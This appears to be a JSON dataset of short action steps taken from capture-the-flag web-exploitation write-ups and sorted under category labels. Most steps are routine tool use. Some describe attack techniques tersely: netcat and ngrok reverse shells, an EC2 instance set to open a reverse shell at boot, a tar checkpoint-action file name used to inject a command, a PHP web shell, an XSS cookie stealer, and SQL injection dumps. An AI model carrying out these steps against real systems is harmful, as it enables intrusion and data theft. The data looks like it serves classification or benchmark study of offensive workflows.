[
    {
        "N/A": [
            "Used shell access to browse the file system.",
            "Identified notable shell script 'findaas' inside '/ctf'.",
            "Executed './findaas flag.txt' command.",
            "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt'.",
            "Executed 'cat ./system/of/a/down/flag.txt' command.",
            "Slept for half a second",
            "Focus on the command line subprocess interaction.",
            "Open the cURL tool",
            "Execute the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
            "Open cURL.",
            "Decided to write a script to automate the process",
            "The author sets up the environment to exploit the SQL Injection challenge.",
            "The iterated character is added to the 'flag'.",
            "Wrote a python script",
            "The script automates the process",
            "Use the 'subprocess.Popen' class.",
            "Start a 'netcat' listener on your server.",
            "Gain a shell.",
            "List the directory.",
            "Run the Python script.",
            "Launch terminal.",
            "Set up a simple Node.js server backend.",
            "Create a PHP file named 'payload.php'",
            "Start the challenge instance.",
            "Open Postman or a similar tool for sending HTTP requests.",
            "Cloned the GitHub repository.",
            "Restarted the container.",
            "Searched for the flag using 'ls /'.",
            "Used the command 'cat /flag.txt' as part of the URL parameter.",
            "Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'.",
            "Install and open Dirb tool",
            "Executed the cURL command",
            "Build the token using NodeJS",
            "Use the 'jsonwebtoken' library",
            "Open jwt_tool.",
            "Specify 'rockyou.txt' as the dictionary file.",
            "Locate the .env file",
            "Use the script available at https://github.com/lijiejie/ds_store_exp.",
            "Execute the developed script.",
            "Use 'dirb' tool",
            "Used PHP system() function.",
            "Executed commands.",
            "Executed 'id' command.",
            "Executed 'ls -al' command.",
            "Listed the directory contents.",
            "Use PHP system() function",
            "Execute commands",
            "Execute 'id' command",
            "Execute 'ls -al' command",
            "Implemented a condition in the Python script.",
            "Unquoted and cleaned up the cookie values within the Python script.",
            "Used the value ':wq' for the 'exit' parameter.",
            "Used the value ':wq' for the 'exit' parameter.",
            "Create a Python script",
            "Design the script to automate the trial and error process",
            "Use the identified class (subprocess.Popen) to list directory content",
            "List directory content remotely using the identified class",
            "Use the 'glob' function to find interesting files",
            "Use the tool 'git-dumper'.",
            "Upload the modified DOCX file",
            "Use jwt.io tool",
            "Download the PCAP file.",
            "Craft a request",
            "Used the provided code snippet.",
            "Launch remote commands using the Python script.",
            "Check the output of the command \"whoami\".",
            "List the files.",
            "Use the output of the script.",
            "Execute '/bin/ls .'",
            "Use the curl command",
            "Use 'git clone https://github.com/sa7mon/S3Scanner.git'",
            "Modify permissions of s3scanner.py",
            "Use 'chmod u+x s3scanner.py'",
            "Install the required dependencies for s3scanner",
            "Use 'pip install -r requirements.txt'",
            "Use 'python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com'",
            "View the contents of the directory",
            "Use 'll'",
            "Identify the usage of exiftool",
            "Attempt to find the current working directory.",
            "Utilize the '/proc/self/' directory.",
            "Access the reference to the current working directory using 'cwd/'.",
            "Set the script to continue downloading missing files.",
            "Created a new directory titled 'ctf-bzr'",
            "Ran the 'bzr status' command on the 'ctf-bzr' repository.",
            "Ran the 'bzr revert' command to restore the 'index.php' file.",
            "Write a Python script to automate the URL enumeration and flag discovery.",
            "Write a Python script that automates this process",
            "Print the 'flag' file content using a bash script.",
            "Construct a Python script.",
            "Automate the process of discovering the next character in the password.",
            "Run the script.",
            "Successfully restore the source code files on local machine.",
            "Wrote a script to use a cache.",
            "Ensured the cache stores all attempts for generating the challenge strings.",
            "Duplicate the server environment.",
            "Set up a redis server.",
            "Create a final script to send the command for flag extraction to the server.",
            "Set up a PHP script on '/pleb.my.ip.nip.io'.",
            "Use the X-Accel-Redirect PHP script.",
            "Create a working script",
            "Understand the need to create a controlled filename.",
            "Execute the brute force PHP script",
            "Start a new process.",
            "Run command line script using curl",
            "Inside the new HTML script element, decide to add an 'imports' key",
            "Set the 'imports' key to map '/js/ast-to-js.mjs' to '/js/eval-code.mjs'",
            "Successfully obtain the flag.",
            "Move into burp suite.",
            "Use version 43.0 for the user-agent string.",
            "Wrote the received response to stdout.",
            "Set up a Python-based environment.",
            "Executed the Python script",
            "Using the command: python3 -m flask run",
            "Use Python-random-module-cracker tool",
            "Open curl in terminal or command line.",
            "Automate the process through script.",
            "Use burp tool to execute the interception.",
            "Used a bash script to extract the PHPSESSID with auth set.",
            "Consider using a tool like singularity to set up a DNS server.",
            "Configure the burpsuite tool.",
            "Start the burpsuite tool.",
            "Checked the docker files.",
            "Saved the request.",
            "Switch to the console.",
            "Create a Python script to automate the process.",
            "Using Accessibility Tool",
            "Launch BurpSuite.",
            "Used the command: nikto -h http://172.17.15.117:443/",
            "Execute the 'ls ../' command to check the parent directory.",
            "Used curl command",
            "Use the internetwache GitTools.",
            "Execute wget to download all available logs.",
            "Used Burpsuite",
            "Uploaded changes",
            "Output the password string and the trimmed section of the server response.",
            "Open the command line tool.",
            "Open Python.",
            "Open Python.",
            "Take a URL as an argument.",
            "Loop through a list of characters.",
            "Note that the server does not have CURL.",
            "Use a python script to send requests.",
            "Write a Python script to automate the process.",
            "Use btoa javascript function.",
            "Create a script to generate the JWT payload.",
            "Copy the output",
            "Use Burp Suite.",
            "Create the file '--checkpoint-action=exec=sh shell.txt'.",
            "Set permissions of the 'id' file to 777",
            "Exported '/tmp' to the PATH",
            "Build a HTML page to automate this process.",
            "Create a Python script.",
            "Use inline commands of Redis to send commands directly.",
            "Utilize the web shell to gain access to the file system.",
            "Observe that due to request length limits around 3000 queries are batched at a time.",
            "Write script to automate this process of generating payloads and making POST requests.",
            "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
            "Encoded the contents of the retrieved file in base64 format for smooth transfer without encoding issues",
            "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
            "Use Python scripting to manipulate the PDF files.",
            "Use the 'mutool' command to manipulate the PDF files.",
            "Create 'merged.pdf' containing a dummy PDF.",
            "Include the chosen input PDFs in the 'merged.pdf'.",
            "Create 'collision1.pdf' with the predetermined prefix.",
            "Create 'collision2.pdf' with the predetermined prefix.",
            "Use the 'mutool info -X' command to verify 'collision1.pdf'.",
            "Use the 'mutool info -X' command to verify 'collision2.pdf'.",
            "Deployed the previously developed JavaScript payload.",
            "Set one of the usernames as '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
            "Compose an SMS message",
            "Navigate to the uploaded webshell.",
            "Copy the output from the crafted reverse shell payload.",
            "Download the `openapi.json` file.",
            "Create a zip file.",
            "Add a `run` bash script to the zip file.",
            "Upload the zip file.",
            "Setup a request",
            "Deploy this page on a server.",
            "Point the 'screenshotter' service to the deployed page.",
            "Create the server script.",
            "Utilize https://jwt.io/ or a JWT-signing library for the JWT creation.",
            "Run the Python script.",
            "Execute '/usr/bin/strings /readflag' command.",
            "Run script.",
            "Noted the use of DOMPurify for HTML sanitization.",
            "Created an attacker server.",
            "Configured the attacker server to make 19 redirects.",
            "Used AWS CLI to access the 'palindromecloudynekos' S3 bucket",
            "Deployed the Python script as a Lambda function",
            "Invoked the Lambda function",
            "Created an EC2 instance using the new role",
            "Configured the EC2 instance to trigger a reverse shell on startup",
            "Automate the submission of different text fragments.",
            "Automate the full exploit chain in solve.py.",
            "Receive the flag on the attacker server.",
            "Run the command 'python3 payload.py | nc localhost 8000'.",
            "Include request body with 'logging' attribute set to true."
        ]
    },
    {
        "Code, Application, and Script Analysis": [
            "Constructed a command to be executed",
            "Noticed the output of 'List Storage' command runs 'df -h'.",
            "Constructed command '/santa_mon.sh \"curl http://localhost:3000/get_flag\"'.",
            "Use the Python subprocess library's getoutput() function.",
            "Open the file index.html.",
            "Download app.py",
            "Run a script with the site's 'secret key' included.",
            "Develop a Python script",
            "Create a client script based on packet structure knowledge.",
            "Executed 'cat index.php' command.",
            "Execute 'cat index.php' command",
            "Wrote a Python script.",
            "Use the 'git diff' command.",
            "Initialized a Bazaar repository within the 'ctf-bzr' directory",
            "Replace each integer into a URL.",
            "Use YAML to analyze the script.",
            "Verified the shellcode's functionality and ensured compatibility with the `strlen()` function within 'shellme()' in the `shellme.so` file.",
            "Begin to test this theory with 'handlebars', a tool which previously had a known vulnerability in processing templates.",
            "Perform the 'cat' command on '/home/user/flag.txt'.",
            "Use the 'requests' library to send HTTP GET requests.",
            "Create a for loop to iterate through the numbers from 1 to 20.",
            "Used the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump'.",
            "Use the 'tryNumber' function.",
            "Write a script to bruteforce each of the hardcoded cookie names.",
            "Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python.",
            "Set up a remote server for this purpose.",
            "Used Remote Flutter Widgets package for decoding.",
            "Validate the files with SHA256 sums"
        ]
    },
    {
        "Documentation, Strategy, and Miscellaneous Techniques": [
            "Wrote a Python script to automate the requests",
            "Discovered a Dockerfile.",
            "Wait for a few seconds for the puppeteer instance to start and load the page.",
            "Use the 'git checkout' command.",
            "Specify the previous commit that contained the flag ('flag.jpg').",
            "Create a local repository.",
            "Initialise a local Bazaar repository.",
            "Write a PHP script",
            "Use the Proof of Concept script",
            "Submit the input.",
            "Generate a custom wordlist of potential log file names.",
            "Deployed the GitHub repository to GitHub pages under a '.jsapi.tech' subdomain."
        ]
    },
    {
        "Information Gathering and Security Analysis": [
            "Use Python's requests library",
            "Lacked the knowledge on how to trigger the aforementioned error.",
            "Led to the Flask.app object",
            "Use the ipaddress library in Python to check the IP address.",
            "Locate the '.git' directory via robots.",
            "Generate a file with random content."
        ]
    },
    {
        "Debugging, Monitoring, and Troubleshooting": [
            "Started the app with 'PORT=8080 npm run start'",
            "Use the curl command",
            "Verify the current size of the tar archive.",
            "Realized that Chrome DevTools can be used for debugging and obtaining the required information."
        ]
    },
    {
        "Network and System Analysis": [
            "Use curl command"
        ]
    },
    {
        "Authentication, Session, and User Management": [
            "Use a Python script to brute force the password"
        ]
    },
    {
        "Data Analysis, Manipulation, and Storage Interactions": [
            "Use an editor",
            "Obtain the text 'cat index.txt'.",
            "Use 'JsonCookies' to create a json object",
            "Add a random timestamp to the POST request body to understand the format.",
            "Write the port number used to a file to keep track."
        ]
    },
    {
        "Exploitation Techniques and Payload Handling": [
            "Execute the crafted payload",
            "Create PHP payload",
            "Simultaneously wrote a Python script",
            "Able to run shell commands.",
            "Use Burp Suite to pass the password despite the character limit",
            "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
            "Utilized script to make the client request.",
            "Gained a reverse shell by invoking the Lambda function",
            "Initialized a server to exploit the above vulnerability."
        ]
    },
    {
        "Cryptography, Encoding, and Decoding Techniques": [
            "Used provided hexadecimal values.",
            "URL encoded the first binary string.",
            "URL encoded the second binary string.",
            "Encode the solution string using base64 to generate the 'userdata' parameter."
        ]
    },
    {
        "Web Interaction and Navigation": [
            "Use 'cd S3Scanner/'",
            "Use 'cd buckets/bucketsoffun-ctf/'",
            "Caused Apache2 to crash due to ':' in directory name.",
            "Used distinct virtual hosts and shell wildcards for the same result.",
            "Send the content of flag.txt to a webhook.",
            "Update the timestamp in the POST request."
        ]
    }
]